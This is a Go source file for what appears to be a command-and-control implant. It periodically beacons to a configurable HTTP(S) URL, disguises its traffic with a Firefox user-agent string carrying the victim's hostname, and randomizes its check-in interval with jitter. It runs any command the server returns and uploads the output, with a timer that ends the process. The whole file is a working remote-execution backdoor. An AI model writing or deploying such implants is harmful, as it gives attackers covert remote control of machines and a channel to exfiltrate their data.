package main

import (
	"math/rand"
	"time"
	"os"
	"os/exec"
	"flag"
	"fmt"
	"io"
	"log"

	"../beaconer"
)

type Config struct {
	url string 
	agent string
	offset int
	jitter float64 
	kill int
}

var config Config

func main() {
	//Command line switches
	var (
		url = flag.String("u", "https://127.0.0.1:443", "URL to beacon to, specify HTTP or HTTPS")
		agent = flag.String("ua", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "User Agent")
		offset = flag.Int("i", 60, "Max beacon interval (seconds)")
		jitter = flag.Float64("j", 0.0, "Beacon interval jitter fraction between 0 and 1")
		timeout = flag.Int("t", 2, "Beacon timeout (minutes)")
	)

	flag.Parse()

	config = Config{*url, *agent, *offset, *jitter, *timeout}

	file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	//add hostname as part of user agent string
	hostname, _ := os.Hostname()
	config.agent = fmt.Sprintf("%s %s", config.agent, hostname) 

	checkIn := time.Now()
	kill := checkIn.Add(time.Duration(config.kill) * time.Minute)
	beacon := beacon.NewHttpAuthBeacon(config.url, config.agent)
	//downloader := downloader.NewHttpDownloader(config.agent)

	for {
		if kill.Before(time.Now()) {
			os.Exit(1)
		}

		command := beacon.Beacon()

		if command != "" {
			output := run(command)
			beacon.Upload(output)
		}

		sleepBeforeCheckIn()
	}
}

// sleep for beacon interval varied by jitter percentage
func sleepBeforeCheckIn() {
	jitter := time.Duration(0)

	if config.jitter != 0.0 {
		jitter = ( time.Duration(config.offset) + time.Duration(float64(config.offset)*config.jitter*(2*rand.Float64()-1)) ) * time.Second
	} else {
		jitter = time.Duration(config.offset) * time.Second
	}
	
	time.Sleep(jitter)
}

// execute command returned by c2 server during http get check in
func run(command string) string {
	cmd := exec.Command(command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "error"
	}
	return string(out)
}